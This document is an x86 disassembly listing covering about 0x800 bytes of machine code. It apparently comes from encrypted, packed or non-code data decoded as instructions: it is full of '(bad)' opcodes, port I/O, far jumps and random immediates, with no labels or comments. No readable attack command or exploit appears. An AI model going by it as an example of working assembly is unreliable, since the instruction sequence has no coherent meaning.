  403168:	call   0x37f6f3e7
  40316d:	sbb    BYTE PTR [ecx+0x17],dh
  403170:	and    al,0x9d
  403172:	dec    esi
  403173:	repnz push edx
  403175:	test   ebx,esp
  403177:	lock mov ds:0x8f7cf6a4,al
  40317d:	int3   
  40317e:	sbb    eax,0xac0efebf
  403183:	adc    DWORD PTR [edi+ebp*2+0x4df42c34],edi
  40318a:	inc    edi
  40318b:	cmp    eax,edx
  40318d:	das    
  40318e:	gs icebp 
  403190:	inc    edi
  403191:	cmc    
  403192:	test   BYTE PTR es:[eax+ebp*2],0x30
  403197:	add    DWORD PTR [edx],ecx
  403199:	adc    DWORD PTR [edi+eax*8],eax
  40319c:	std    
  40319d:	pop    esi
  40319e:	and    DWORD PTR [edx+0x9aed4b3],eax
  4031a4:	idiv   DWORD PTR [eax]
  4031a6:	shr    ebp,cl
  4031a8:	cmp    BYTE PTR [esi+0x3d],cl
  4031ab:	fcom   st(7)
  4031ad:	xor    DWORD PTR [ecx+0x683d5404],ebp
  4031b3:	sub    DWORD PTR [esi-0x4e],edx
  4031b6:	outs   dx,DWORD PTR ds:[esi]
  4031b7:	cmp    bh,BYTE PTR [ecx-0x57c7bd86]
  4031bd:	xchg   esp,eax
  4031be:	stos   BYTE PTR es:[edi],al
  4031bf:	int3   
  4031c0:	sub    eax,0xec35150b
  4031c5:	not    DWORD PTR [ebp+0x49cdc1cc]
  4031cb:	popf   
  4031cc:	mov    ch,0xec
  4031ce:	adc    ah,BYTE PTR [ecx+0x23e3005c]
  4031d4:	adc    eax,0x41a1ece8
  4031d9:	xchg   esi,eax
  4031da:	xchg   ecx,ebp
  4031dc:	jmp    0xf04:0xb7582ce1
  4031e3:	ins    DWORD PTR es:[edi],dx
  4031e4:	ds aas 
  4031e6:	leave  
  4031e7:	inc    eax
  4031e8:	add    eax,ebx
  4031ea:	dec    esi
  4031eb:	jno    0x40324a
  4031ed:	(bad)  
  4031ee:	mov    ds:0x39b9ec24,al
  4031f3:	push   ds
  4031f4:	pop    DWORD PTR [eax+0x58]
  4031f7:	dec    esp
  4031f8:	adc    cl,BYTE PTR [ecx-0x6cc5462c]
  4031fe:	stos   BYTE PTR es:[edi],al
  4031ff:	jo     0x403239
  403201:	cmp    DWORD PTR [eax+0x20],edx
  403204:	dec    ebx
  403205:	test   eax,0x58b51dca
  40320a:	out    dx,eax
  40320b:	mov    edi,0x58a2441b
  403210:	mov    ebx,0xd2f0a4b9
  403215:	aas    
  403216:	dec    eax
  403217:	xchg   esi,eax
  403218:	pop    esp
  403219:	je     0x40326b
  40321b:	adc    esi,DWORD PTR [ecx-0x57]
  40321e:	mov    esi,0xb404054
  403223:	sti    
  403224:	add    eax,0xd8ae5cbf
  403229:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40322a:	in     eax,dx
  40322b:	mov    dl,0x26
  40322d:	cmp    eax,0x4eb78be7
  403232:	or     dl,BYTE PTR [edx+0x2646f047]
  403238:	cmc    
  403239:	pop    ebp
  40323a:	icebp  
  40323b:	loope  0x4032a7
  40323d:	mov    edi,0xf59cb7f0
  403242:	into   
  403243:	mov    eax,0xef0a43ff
  403248:	scas   al,BYTE PTR es:[edi]
  403249:	lods   al,BYTE PTR ds:[esi]
  40324a:	fdiv   DWORD PTR [ebp+0x2c]
  40324d:	rdpmc  
  40324f:	pop    esp
  403250:	fdivr  st,st(7)
  403252:	icebp  
  403253:	popa   
  403254:	or     DWORD PTR [edx+0x5b],esi
  403257:	fsubr  QWORD PTR [bp-0x3bd9]
  40325c:	lods   eax,DWORD PTR ds:[esi]
  40325d:	jo     0x403285
  40325f:	loope  0x4032bf
  403261:	ret    
  403262:	popf   
  403263:	inc    esi
  403264:	mov    edi,0xa7aef5c
  403269:	aam    0xd4
  40326b:	fnstsw WORD PTR [edi+0x105a82e3]
  403271:	or     al,0x70
  403273:	out    0xc0,eax
  403275:	(bad)  
  403276:	in     al,dx
  403277:	jg     0x4032b7
  403279:	lods   al,BYTE PTR ds:[esi]
  40327a:	mov    al,0xa1
  40327c:	ins    DWORD PTR es:[edi],dx
  40327d:	push   ds
  40327e:	and    eax,0xc26b69f8
  403283:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403284:	repnz es xchg ebx,eax
  403287:	jmp    0x403297
  403289:	add    DWORD PTR [ebp+0x43db79b],ebx
  40328f:	push   edx
  403290:	cmp    DWORD PTR [edx-0x74],0x6e
  403294:	into   
  403295:	es mov ecx,0x488a5ba5
  40329b:	int3   
  40329c:	add    esi,DWORD PTR [ebp-0x590b990e]
  4032a2:	out    0x1,eax
  4032a4:	mov    ds:0x3e0144f9,al
  4032a9:	lods   eax,DWORD PTR ds:[esi]
  4032aa:	xor    al,0xe8
  4032ac:	shr    esi,0x18
  4032af:	dec    eax
  4032b0:	jmp    FWORD PTR [edx-0x16362880]
  4032b6:	inc    edi
  4032b7:	scas   al,BYTE PTR es:[edi]
  4032b8:	stos   DWORD PTR es:[edi],eax
  4032b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032ba:	mov    ah,0x34
  4032bc:	dec    edi
  4032bd:	adc    BYTE PTR [ebx],0x28
  4032c0:	cmc    
  4032c1:	in     eax,dx
  4032c2:	push   es
  4032c3:	and    ch,BYTE PTR [ebx]
  4032c5:	xchg   ebp,eax
  4032c6:	in     eax,dx
  4032c7:	inc    edi
  4032c8:	pop    ss
  4032c9:	icebp  
  4032ca:	cs adc edi,DWORD PTR cs:0xa95d7e26
  4032d2:	push   esi
  4032d3:	sbb    ecx,ebx
  4032d5:	jge    0x403308
  4032d7:	and    al,0xc2
  4032d9:	mov    esi,0x6854120c
  4032de:	jle    0x403301
  4032e0:	fmul   QWORD PTR [ecx+0x5fb11803]
  4032e6:	lds    eax,FWORD PTR [edi+ebp*2]
  4032e9:	cmovp  ecx,DWORD PTR [edi]
  4032ec:	xor    edi,DWORD PTR [eax+edi*2+0x54]
  4032f0:	mov    edi,DWORD PTR [edi+edi*8-0x5be0f3d3]
  4032f7:	mov    ds:0x7de13a52,al
  4032fc:	jle    0x40331f
  4032fe:	fiadd  DWORD PTR [edx+0x60b216dc]
  403304:	jge    0x4032e3
  403306:	je     0x4032aa
  403308:	cs aam 0x7b
  40330b:	cdq    
  40330c:	clc    
  40330d:	jg     0x4032c6
  40330f:	xchg   edi,eax
  403310:	fild   WORD PTR [edx+0x61]
  403313:	iret   
  403314:	loope  0x4032db
  403316:	push   ecx
  403317:	or     bh,BYTE PTR [esi-0x89865e4]
  40331d:	mov    ch,0x8f
  40331f:	inc    ecx
  403320:	mul    BYTE PTR [ebp-0x3ff6db15]
  403326:	scas   eax,DWORD PTR es:[edi]
  403327:	retf   
  403328:	xchg   ebp,eax
  403329:	cmp    BYTE PTR [ebp+ebx*4-0x4e8a822a],al
  403330:	in     eax,dx
  403331:	jns    0x403308
  403333:	bound  edx,QWORD PTR [eax]
  403335:	sbb    ebx,ecx
  403337:	cwde   
  403338:	in     al,dx
  403339:	mov    al,ch
  40333b:	sub    DWORD PTR [ebp-0x7f6a8cb8],edi
  403341:	dec    ecx
  403342:	push   cs
  403343:	aam    0xec
  403345:	dec    ebx
  403346:	adc    dh,BYTE PTR [edi+0x13]
  403349:	mov    edi,0xdcb729b8
  40334e:	pop    es
  40334f:	(bad)  
  403350:	clc    
  403351:	enter  0x70fa,0x95
  403355:	test   eax,0xef8d5b54
  40335a:	pushf  
  40335b:	shr    BYTE PTR [edx+edx*4],0x1
  40335f:	jnp    0x4032fc
  403361:	push   ebp
  403362:	jge    0x403334
  403364:	push   ebx
  403365:	rcr    BYTE PTR [ebx-0x654d6cec],cl
  40336b:	mov    esp,0xd111c4c1
  403370:	(bad)  
  403371:	inc    edi
  403372:	pop    edx
  403373:	inc    edx
  403374:	test   DWORD PTR ds:0x2603654,edi
  40337a:	addr16 pop esp
  40337c:	sbb    al,0x59
  40337e:	jno    0x4033c0
  403380:	inc    esi
  403381:	retf   
  403382:	pusha  
  403383:	push   0xcca892ca
  403388:	jmp    0x6392:0x8f123e30
  40338f:	dec    edx
  403390:	(bad)  
  403391:	scas   eax,DWORD PTR es:[edi]
  403392:	mov    edx,edi
  403394:	aas    
  403395:	sub    eax,0x8de06c0f
  40339a:	sbb    BYTE PTR [edi+edx*8-0x29],bl
  40339e:	stos   BYTE PTR es:[edi],al
  40339f:	in     al,0x8
  4033a1:	mov    ebx,0x32dcc06b
  4033a6:	mov    al,0x24
  4033a8:	jns    0x40336d
  4033aa:	dec    eax
  4033ab:	test   eax,0x41edc3be
  4033b0:	mov    esp,0xd21ab050
  4033b5:	sbb    BYTE PTR [esi+0x70],dl
  4033b8:	inc    edx
  4033b9:	xor    bh,bh
  4033bb:	(bad)  
  4033bd:	sub    dl,BYTE PTR [ebx]
  4033bf:	test   eax,0x5a720201
  4033c4:	in     al,0xd1
  4033c6:	push   0x88f31f2a
  4033cb:	(bad)  
  4033cc:	punpckhbw mm5,mm1
  4033cf:	pop    es
  4033d0:	inc    ebx
  4033d1:	xor    ebx,DWORD PTR [edi-0x14]
  4033d4:	sbb    DWORD PTR [ecx],eax
  4033d6:	fiadd  DWORD PTR [eax-0x215f01a9]
  4033dc:	into   
  4033dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033de:	and    eax,DWORD PTR [esi]
  4033e0:	adc    ecx,DWORD PTR [eax]
  4033e2:	bound  edi,QWORD PTR [edx]
  4033e4:	and    ch,0x0
  4033e7:	and    al,0x93
  4033e9:	mov    es,WORD PTR [ecx-0x3fcab44f]
  4033ef:	into   
  4033f0:	push   ss
  4033f1:	mov    ebp,0xa44bb012
  4033f6:	add    eax,0x9921ce7a
  4033fb:	push   eax
  4033fc:	fcomp  DWORD PTR [ecx]
  4033fe:	xchg   ebp,eax
  4033ff:	in     ax,dx
  403401:	fsubr  st(7),st
  403403:	pop    ss
  403404:	out    0x34,eax
  403406:	out    0x4a,al
  403408:	loop   0x4033e5
  40340a:	js     0x40345b
  40340c:	push   ebp
  40340d:	fisttp WORD PTR [edi]
  40340f:	or     BYTE PTR [ecx+0x72],0xb2
  403413:	lods   eax,DWORD PTR ds:[esi]
  403414:	xchg   BYTE PTR [edi],al
  403416:	idiv   BYTE PTR [ebx+0x14]
  403419:	enter  0xe547,0x71
  40341d:	and    al,BYTE PTR [ebx-0x22]
  403420:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403421:	cmp    eax,0xca89303b
  403427:	(bad)  
  403428:	sub    al,BYTE PTR [edi+edi*4-0x33e8d8c3]
  40342f:	mov    ds:0x953fb364,al
  403434:	mov    ah,0xaa
  403436:	das    
  403437:	data16 sbb al,0x4f
  40343a:	adc    dh,bh
  40343c:	xchg   edx,eax
  40343d:	outs   dx,DWORD PTR ds:[esi]
  40343e:	pushf  
  40343f:	aaa    
  403440:	dec    esp
  403441:	dec    esi
  403442:	pop    edi
  403443:	iret   
  403444:	mul    BYTE PTR [edx+edi*1+0x7f]
  403448:	xlat   BYTE PTR ds:[ebx]
  403449:	or     edx,DWORD PTR [esi]
  40344b:	mov    ds:0xbc2dc5c1,al
  403450:	ds push cs
  403452:	lods   al,BYTE PTR ds:[esi]
  403453:	das    
  403454:	and    eax,DWORD PTR [ebx+0x1f4a4712]
  40345a:	pop    edi
  40345b:	pop    ebx
  40345c:	test   DWORD PTR [edi-0x542ea43e],0x28c97382
  403466:	dec    ebp
  403467:	retf   
  403468:	push   0xfffffff1
  40346a:	mov    dl,0x7b
  40346c:	rcl    DWORD PTR [ebp+ebp*2-0x23],0x15
  403471:	gs aas 
  403473:	aas    
  403474:	xor    eax,0x373f2571
  403479:	out    dx,al
  40347a:	lea    edx,[esi]
  40347c:	mov    al,0xd3
  40347e:	xchg   ecx,eax
  40347f:	mov    dh,0x3b
  403481:	lock scas al,BYTE PTR es:[edi]
  403483:	enter  0xe031,0xdb
  403487:	cmp    eax,0xbf6268c5
  40348c:	shl    BYTE PTR [eax],cl
  40348e:	or     ebp,DWORD PTR [edx]
  403490:	clc    
  403491:	pop    es
  403492:	nop
  403493:	and    cl,BYTE PTR [ecx+0x0]
  403496:	mov    ch,0xec
  403498:	daa    
  403499:	lock and al,0x5e
  40349c:	jae    0x40347b
  40349e:	add    eax,0xf29c2759
  4034a3:	xchg   esi,eax
  4034a4:	int3   
  4034a5:	mov    ch,0x10
  4034a7:	js     0x4034ee
  4034a9:	sub    eax,0x11422124
  4034ae:	fidivr WORD PTR [esi-0x2d8aa359]
  4034b4:	xor    al,0x1a
  4034b6:	push   cs
  4034b7:	xchg   esp,eax
  4034b8:	ins    BYTE PTR es:[edi],dx
  4034b9:	icebp  
  4034ba:	frstor [edi+edx*8-0x21bcfd68]
  4034c1:	pop    esi
  4034c2:	loopne 0x40348a
  4034c4:	xchg   BYTE PTR [esi+0x7afac04b],ch
  4034ca:	(bad)  
  4034cb:	pop    esi
  4034cc:	adc    eax,0x426c0cf
  4034d1:	jo     0x403544
  4034d3:	dec    ebp
  4034d4:	(bad)  
  4034d5:	sub    ebp,DWORD PTR ds:0x8a4ab82e
  4034db:	stc    
  4034dc:	outs   dx,BYTE PTR ds:[esi]
  4034dd:	in     al,dx
  4034de:	sbb    edx,DWORD PTR [ecx+0xc]
  4034e1:	mov    ecx,eax
  4034e3:	(bad)  
  4034e4:	bound  ebx,QWORD PTR [esi]
  4034e6:	mov    esi,0xc1974b17
  4034eb:	rcl    DWORD PTR [ebx+0x13],cl
  4034ee:	sub    dl,cl
  4034f0:	push   0x3a
  4034f2:	rol    DWORD PTR [esi-0x10],1
  4034f5:	jmp    0x4034ab
  4034f7:	shl    BYTE PTR [eax+edi*1-0x3c],cl
  4034fb:	xor    BYTE PTR [edi+0x37e28c0f],al
  403501:	stc    
  403502:	call   0x99f3b122
  403507:	call   0x1eb8:0x71d48280
  40350e:	rol    DWORD PTR [ecx],cl
  403510:	das    
  403511:	jmp    0xba0a:0x5bee70b7
  403518:	ins    BYTE PTR es:[edi],dx
  403519:	sbb    al,BYTE PTR [ebx+0x68]
  40351c:	sbb    DWORD PTR [edx-0x72],eax
  40351f:	lea    ecx,[eax-0x67ad4357]
  403525:	inc    ecx
  403526:	pushf  
  403527:	sti    
  403528:	scas   al,BYTE PTR es:[edi]
  403529:	lock xchg ebp,eax
  40352b:	jnp    0x403583
  40352d:	ja     0x403544
  40352f:	ins    BYTE PTR es:[edi],dx
  403530:	enter  0x9f02,0x62
  403534:	mov    ch,0x60
  403536:	mov    cl,0xac
  403538:	xor    esi,edx
  40353a:	adc    eax,0xe86e60d7
  40353f:	std    
  403540:	cs out 0x0,al
  403543:	(bad)  
  403544:	shr    DWORD PTR [eax*4-0x686ebb1c],0xef
  40354c:	pand   mm7,QWORD PTR [edx]
  40354f:	adc    al,0xca
  403552:	sub    DWORD PTR [ebp+0x49],ebp
  403555:	in     eax,dx
  403556:	loope  0x403568
  403558:	fsubr  st,st(3)
  40355a:	stos   DWORD PTR es:[edi],eax
  40355b:	pushf  
  40355c:	fstp   TBYTE PTR [esi]
  40355e:	jmp    0x57c4a196
  403563:	stos   BYTE PTR es:[edi],al
  403564:	jns    0x40351b
  403566:	xchg   ebx,eax
  403567:	sar    BYTE PTR [ebx+0x32489876],cl
  40356d:	fld    QWORD PTR [ecx+0x1b8c74a3]
  403573:	mov    dl,0xcc
  403575:	clc    
  403576:	pop    edi
  403577:	es out 0x47,eax
  40357a:	add    al,0x62
  40357c:	dec    esi
  40357d:	xchg   esp,eax
  40357e:	les    ebp,FWORD PTR ds:0x4fb7b49d
  403584:	imul   edx,DWORD PTR [edx+0x41],0x7f
  403588:	mov    ebp,ebp
  40358a:	addr16 inc edi
  40358c:	int3   
  40358d:	mov    fs,WORD PTR [edi]
  40358f:	mov    ecx,0x849338fa
  403594:	jge    0x403574
  403596:	push   cs
  403597:	push   ss
  403598:	loop   0x40353f
  40359a:	push   ds
  40359b:	(bad)  
  40359c:	add    al,0x53
  40359e:	call   0x7929:0xf8834c87
  4035a5:	retf   0xfd3e
  4035a8:	clc    
  4035a9:	pop    ebp
  4035aa:	xchg   ebx,eax
  4035ab:	mov    bh,0x5b
  4035ad:	sub    eax,0x660d00cd
  4035b2:	je     0x40362e
  4035b4:	sbb    cl,BYTE PTR [esi+0x6a]
  4035b7:	xor    esi,ecx
  4035b9:	rol    DWORD PTR [edi],cl
  4035bb:	into   
  4035bc:	in     eax,dx
  4035bd:	or     BYTE PTR [esi+0x2d8c89f8],0x23
  4035c4:	add    BYTE PTR [edx],bl
  4035c6:	aam    0xd4
  4035c8:	lds    eax,FWORD PTR [ecx+edx*8+0x32]
  4035cc:	pop    edx
  4035cd:	or     bl,0xe8
  4035d0:	stc    
  4035d1:	mov    ah,ch
  4035d3:	fdiv   QWORD PTR [esi]
  4035d5:	jecxz  0x4035f9
  4035d7:	not    DWORD PTR [edi-0x42e26fb9]
  4035dd:	mov    ah,0x13
  4035df:	sar    DWORD PTR [ebx],0x2e
  4035e2:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4035e4:	inc    ebx
  4035e5:	(bad)  
  4035e6:	leave  
  4035e7:	test   DWORD PTR ds:0x8de1f255,ebp
  4035ed:	and    ebp,esi
  4035ef:	xor    eax,0x88a4787f
  4035f4:	mov    eax,0x93d61d78
  4035f9:	cmc    
  4035fa:	sbb    eax,0xaabfda2f
  4035ff:	sti    
  403600:	ficom  DWORD PTR [ecx+0x22877491]
  403606:	jecxz  0x4035b6
  403608:	aaa    
  403609:	and    DWORD PTR [esp+edx*4-0x1a11079],eax
  403610:	ret    
  403611:	xor    eax,0xdb9c5249
  403616:	rcl    BYTE PTR [esi],1
  403618:	(bad)  
  40361a:	or     BYTE PTR fs:[ebx+0x2e],0xa4
  40361f:	cmp    DWORD PTR [edx-0x46],edx
  403622:	mov    edx,0xb66a3e79
  403627:	and    DWORD PTR [edi],edi
  403629:	push   esi
  40362a:	adc    cl,BYTE PTR [ebp+0x63f2c70e]
  403630:	dec    eax
  403631:	imul   esp,DWORD PTR [ebx],0x61
  403634:	shl    DWORD PTR [ebx+0x70],1
  403637:	xlat   BYTE PTR ds:[bx]
  403639:	mov    ebp,0x62de724f
  40363e:	and    BYTE PTR [ebx],ch
  403640:	retf   0x7a38
  403643:	or     BYTE PTR [ebp+ebp*1+0x1c706fca],al
  40364a:	push   0x5e
  40364c:	popa   
  40364d:	aaa    
  40364e:	outs   dx,DWORD PTR ds:[esi]
  40364f:	push   ebp
  403650:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403651:	mov    ecx,0xec6dcab4
  403656:	xor    ebx,ebp
  403658:	fidivr WORD PTR [ecx-0x1438b7e4]
  40365e:	gs mov esp,es
  403661:	jns    0x403628
  403663:	jg     0x403685
  403665:	push   cs
  403666:	outs   dx,BYTE PTR ds:[esi]
  403667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403668:	retf   
  403669:	mov    DWORD PTR [esi+0x67365c8b],ebx
  40366f:	inc    esi
  403670:	pop    ss
  403671:	jge    0x403678
  403673:	pop    eax
  403674:	jmp    0x71eea5f6
  403679:	fnstcw WORD PTR [edx-0x3af834ba]
  40367f:	outs   dx,BYTE PTR ds:[esi]
  403680:	pop    edi
  403681:	jnp    0x4036a6
  403683:	jo     0x40367d
  403685:	addr16 mov ebx,0x9c4ccfbe
  40368b:	(bad)
  40368f:	fdiv   DWORD PTR [ebp+0x3beb3b74]
  403695:	mov    dh,0xff
  403697:	dec    ebx
  403698:	mov    ch,0x58
  40369a:	nop
  40369b:	ss hlt 
  40369d:	xor    al,0x65
  40369f:	shl    DWORD PTR [eax+eax*4-0x651927ed],0x1b
  4036a7:	mov    edi,0x7131ec4f
  4036ac:	sbb    ch,BYTE PTR [ebx-0x3e]
  4036af:	dec    ebp
  4036b0:	xchg   ebx,eax
  4036b1:	fxch   st(4)
  4036b3:	lds    esp,FWORD PTR [eax]
  4036b5:	je     0x4036ab
  4036b7:	mov    ch,0xff
  4036b9:	test   ebp,esi
  4036bb:	mov    edi,0x178a7e42
  4036c0:	mov    edi,0x7da1dddc
  4036c5:	mov    dh,BYTE PTR [ebp-0x2feb6fbb]
  4036cb:	ret    0x148f
  4036ce:	push   es
  4036cf:	ss jns 0x403685
  4036d2:	or     al,0xfa
  4036d4:	jp     0x403694
  4036d6:	jae    0x4036e9
  4036d8:	shl    BYTE PTR [ecx+0x5d],1
  4036db:	into   
  4036dc:	add    bl,bl
  4036de:	std    
  4036df:	std    
  4036e0:	es inc eax
  4036e2:	jnp    0x4036bc
  4036e4:	mov    ebx,0xd6c9b0c4
  4036e9:	lods   eax,DWORD PTR ds:[esi]
  4036ea:	mov    edi,0x21a2a8c3
  4036ef:	loopne 0x403673
  4036f1:	dec    ecx
  4036f2:	add    BYTE PTR [ebx+eiz*1],cl
  4036f5:	mov    eax,0xbe6c4984
  4036fa:	cmp    edx,esp
  4036fc:	(bad)  [eax]
  4036fe:	push   esp
  4036ff:	adc    edx,DWORD PTR [ebp+0x5e]
  403702:	push   ecx
  403703:	repz xor edx,DWORD PTR [ebx+0x44]
  403707:	fsubr  QWORD PTR [edx]
  403709:	push   esp
  40370a:	clc    
  40370b:	clc    
  40370c:	rcl    BYTE PTR [ebx+0x7f],cl
  40370f:	jge    0x4036df
  403711:	int    0x8e
  403713:	add    ebp,DWORD PTR [edx+0x4dfe79dd]
  403719:	arpl   dx,cx
  40371b:	(bad)  
  40371c:	enter  0x1d93,0x1f
  403720:	popf   
  403721:	or     BYTE PTR [edx+0x6f05f2d],cl
  403727:	data16 adc al,0xe3
  40372a:	mov    eax,0xfb8dc05e
  40372f:	inc    esp
  403730:	das    
  403731:	adc    dl,BYTE PTR [ebp+ecx*2-0x1a6e26af]
  403738:	test   edi,edi
  40373a:	add    BYTE PTR [esi+eax*1+0x30],0x18
  40373f:	js     0x403710
  403741:	aam    0x26
  403743:	mov    ds:0x488ad9cc,al
  403748:	dec    esp
  403749:	xor    dh,BYTE PTR [ebx-0x5f]
  40374c:	aaa    
  40374d:	rcl    dh,1
  40374f:	mov    esi,0xb8cadb60
  403754:	jg     0x40371e
  403756:	adc    eax,0xe8fdeb09
  40375b:	jge    0x4036f7
  40375d:	leave  
  40375e:	pusha  
  40375f:	dec    ebp
  403760:	add    eax,0xc4986530
  403765:	mov    bh,0x22
  403767:	stos   BYTE PTR es:[edi],al
  403768:	push   ds
  403769:	and    esp,DWORD PTR [esi-0x2f]
  40376c:	(bad)  
  40376d:	sbb    edx,DWORD PTR [edx+0xc]
  403770:	xchg   edi,eax
  403771:	call   0x5c2d:0x48d2e685
  403778:	stc    
  403779:	inc    BYTE PTR [edi]
  40377b:	inc    edx
  40377c:	mov    BYTE PTR [ebp-0x4a],bh
  40377f:	out    0x4d,eax
  403781:	lea    esp,[esi]
  403783:	jbe    0x4037d2
  403785:	push   cs
  403786:	cmp    ecx,DWORD PTR [ebp-0x5b0e6fbd]
  40378c:	shr    BYTE PTR cs:[ebx+0x7fbc6f80],1
  403793:	pop    ebp
  403794:	shl    DWORD PTR [edi-0x29a98feb],0xb6
  40379b:	ja     0x4037cd
  40379d:	push   eax
  40379e:	xchg   ecx,eax
  40379f:	in     eax,0xef
  4037a1:	add    DWORD PTR [ebx+0x41917825],0x1e
  4037a8:	xor    dl,bl
  4037aa:	neg    DWORD PTR [ebx+0x64de887a]
  4037b0:	adc    al,0x89
  4037b2:	dec    esp
  4037b3:	sbb    eax,0x41f07066
  4037b8:	xchg   edx,eax
  4037ba:	in     eax,dx
  4037bb:	dec    ebx
  4037bc:	cs mov ch,0x59
  4037bf:	test   BYTE PTR [ebp-0x54],0x3f
  4037c3:	scas   al,BYTE PTR es:[edi]
  4037c4:	mov    ebp,0xc6db1027
  4037c9:	xchg   ebx,eax
  4037ca:	jp     0x403760
  4037cc:	adc    DWORD PTR [edi+0x72289ad9],edi
  4037d2:	push   cs
  4037d3:	add    ah,BYTE PTR [eax+0x66e4f8e8]
  4037d9:	sbb    bl,cl
  4037db:	(bad)  [esi+0x20]
  4037de:	fcomi  st,st(5)
  4037e0:	arpl   WORD PTR [edi-0x69],cx
  4037e3:	call   DWORD PTR [eax+0x4]
  4037e6:	ja     0x403849
  4037e8:	xor    DWORD PTR [ebp+0x55445c42],esi
  4037ee:	daa    
  4037ef:	inc    eax
  4037f0:	jb     0x40383e
  4037f2:	neg    BYTE PTR [ebx-0x7b00c7a1]
  4037f8:	or     ebx,ebx
  4037fa:	repnz dec ebx
  4037fc:	dec    esp
  4037fd:	out    0x17,al
  4037ff:	dec    edx
  403800:	outs   dx,BYTE PTR ds:[esi]
  403801:	mov    ds:0x851e16e,eax
  403806:	pop    ecx
  403807:	test   BYTE PTR [ecx+0x6f],0x78
  40380b:	cwde   
  40380c:	xor    eax,0xdf502bee
  403811:	and    al,0x6a
  403813:	cmp    ecx,DWORD PTR [edx+0x6d]
  403816:	mov    eax,0xc3263a42
  40381b:	cmp    DWORD PTR [ebp-0x64],esi
  40381e:	and    BYTE PTR [edi],al
  403820:	mov    esi,0xd5638fab
  403825:	mov    dl,BYTE PTR [ecx]
  403827:	pop    esp
  403828:	cmp    ebx,eax
  40382a:	sub    eax,esi
  40382c:	lods   al,BYTE PTR ds:[esi]
  40382d:	mov    al,0x4b
  40382f:	mov    edi,0xa53d158a
  403834:	scas   eax,DWORD PTR es:[edi]
  403835:	out    0x57,al
  403837:	cmp    DWORD PTR [edx+0x2f],eax
  40383a:	mov    eax,ds:0xf1f45bd1
  40383f:	js     0x403824
  403841:	adc    DWORD PTR [ebx],edx
  403843:	and    BYTE PTR [esi-0x62],ch
  403846:	test   BYTE PTR [esi],0xff
  403849:	pushf  
  40384a:	inc    esp
  40384b:	ins    DWORD PTR es:[edi],dx
  40384c:	push   ecx
  40384d:	xchg   ecx,eax
  40384e:	or     DWORD PTR [edi],ebp
  403850:	dec    ebx
  403851:	out    dx,eax
  403852:	mov    ax,ds:0xb34b63f3
  403858:	mov    bl,0xc6
  40385a:	pop    edi
  40385b:	addr16 dec ecx
  40385d:	in     al,0xd4
  40385f:	and    al,0xc9
  403861:	retf   0x3f33
  403864:	ja     0x40387c
  403866:	mov    bl,0x19
  403868:	mov    al,0xdc
  40386a:	jmp    0xb305850b
  40386f:	mov    WORD PTR [eax-0x73],ds
  403872:	lds    ecx,FWORD PTR [edx]
  403874:	int3   
  403875:	xor    eax,0x2561941c
  40387a:	pushw  0x78c3
  40387e:	add    ah,dh
  403880:	fld    QWORD PTR [ecx]
  403882:	adc    bl,cl
  403884:	push   esp
  403885:	adc    DWORD PTR [ebp+0x2f],eax
  403888:	add    eax,0xb8ea5b74
  40388d:	xchg   edi,eax
  40388e:	cwde   
  40388f:	std    
  403890:	xor    DWORD PTR [ecx+0x5a9a9fff],esi
  403896:	dec    ebx
  403897:	dec    eax
  403898:	fcmovnu st,st(6)
  40389a:	jecxz  0x403866
  40389c:	ins    DWORD PTR es:[edi],dx
  40389d:	sub    al,0xe3
  40389f:	(bad)  
  4038a0:	cld    
  4038a1:	xor    DWORD PTR [esi],ecx
  4038a3:	(bad)  
  4038a4:	xor    DWORD PTR [edi-0x20],ebp
  4038a7:	mov    bh,ch
  4038a9:	ss jg  0x403895
  4038ac:	add    al,0xbf
  4038ae:	shl    ebp,cl
  4038b0:	ss add al,0xa4
  4038b3:	adc    ebp,esi
  4038b5:	cld    
  4038b6:	xchg   ebx,eax
  4038b7:	xor    edx,DWORD PTR [esi-0x706d5aa3]
  4038bd:	lock lds edi,FWORD PTR [esi]
  4038c0:	popa   
  4038c1:	outs   dx,BYTE PTR ds:[esi]
  4038c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038c3:	xchg   ebp,eax
  4038c4:	sbb    al,0x34
  4038c6:	mov    fs,WORD PTR [edx+0x78]
  4038c9:	xchg   ecx,eax
  4038ca:	daa    
  4038cb:	rcl    BYTE PTR [eax],cl
  4038cd:	out    0x98,eax
  4038cf:	jb     0x4038ef
  4038d1:	inc    esi
  4038d2:	into   
  4038d3:	ret    
  4038d4:	and    DWORD PTR ds:0x9f09a432,ebx
  4038da:	xchg   BYTE PTR [ecx+0x21],bl
  4038dd:	ret    0xefd0
  4038e0:	and    eax,0x85eee80e
  4038e5:	add    DWORD PTR [esi+eiz*2],esi
  4038e8:	scas   eax,DWORD PTR es:[edi]
  4038e9:	and    BYTE PTR [ecx-0x5da7305c],dl
  4038ef:	dec    ebx
  4038f0:	xor    ebx,eax
  4038f2:	push   edx
  4038f4:	adc    dh,ah
  4038f6:	dec    ebx
  4038f7:	leave  
  4038f8:	mov    ebp,0x31748c7
  4038fd:	jl     0x4038de
  4038ff:	inc    edi
  403900:	cli    
  403901:	(bad)  
  403902:	push   ebp
  403903:	(bad)  
  403904:	cdq    
  403905:	jp     0x403888
  403907:	(bad)  
  403908:	jmp    0x3cff:0xd008e86e
  40390f:	scas   al,BYTE PTR es:[edi]
  403910:	inc    ebx
  403911:	add    al,0x73
  403913:	sti    
  403914:	(bad)  
  403916:	xor    eax,0x154c7f0
  40391c:	ds cs mov edi,0xae2c6ac6
  403923:	sub    BYTE PTR [eax],bh
  403925:	mov    esp,0x657712d5
  40392a:	int    0xfb
  40392c:	sbb    dh,BYTE PTR [edi+0x526db7e]
  403932:	sbb    eax,0xbfe2cf9b
  403937:	push   edi
  403938:	bt     esi,0xba
  40393c:	(bad)  
  40393d:	nop
  40393e:	xor    al,0x67
  403940:	xchg   edi,eax
  403941:	pop    esi
  403943:	inc    esi
  403944:	mov    ebp,0xafe305f0
  403949:	sub    eax,0x1a25d6cb
  40394e:	dec    esi
  40394f:	adc    BYTE PTR [ebx],dh
  403951:	and    WORD PTR [esi+eax*4-0x4e],di
  403956:	out    dx,al
